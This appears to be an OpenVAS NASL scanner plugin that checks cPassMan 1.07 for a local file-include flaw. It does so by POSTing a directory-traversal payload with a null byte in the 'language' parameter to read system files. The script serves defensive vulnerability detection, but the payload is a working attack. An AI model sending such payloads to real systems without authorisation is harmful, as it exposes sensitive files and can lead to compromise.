###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_passman_43466.nasl 11235 2018-09-05 08:57:41Z cfischer $
#
# Collaborative Passwords Manager (cPassMan) Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cpassman:cpassman";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100828");
  script_version("$Revision: 11235 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-05 10:57:41 +0200 (Wed, 05 Sep 2018) $");
  script_tag(name:"creation_date", value:"2010-09-28 17:11:37 +0200 (Tue, 28 Sep 2010)");
  script_bugtraq_id(43466);
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_name("Collaborative Passwords Manager (cPassMan) Multiple Local File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_passman_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cpassman/detected");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43466");
  script_xref(name:"URL", value:"http://code.google.com/p/cpassman/");
  script_xref(name:"URL", value:"http://cpassman.org/");

  script_tag(name:"summary", value:"cPassMan is prone to multiple local file-include
  vulnerabilities because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain
  potentially sensitive information and to execute arbitrary local scripts in the context
  of the webserver process. This may allow the attacker to compromise the application and
  the computer. Other attacks are also possible.");

  script_tag(name:"affected", value:"cPassMan 1.07 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";
url = dir + "/index.php";

files = traversal_files();

host = http_host_name( port:port );

foreach file( keys( files ) ) {

  postdata = "language=../../../../../../../../../../../../../../../../../" + files[file] + "%00";

  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata), "\r\n",
                "\r\n",
                postdata );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( egrep( pattern:file, string:res, icase:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );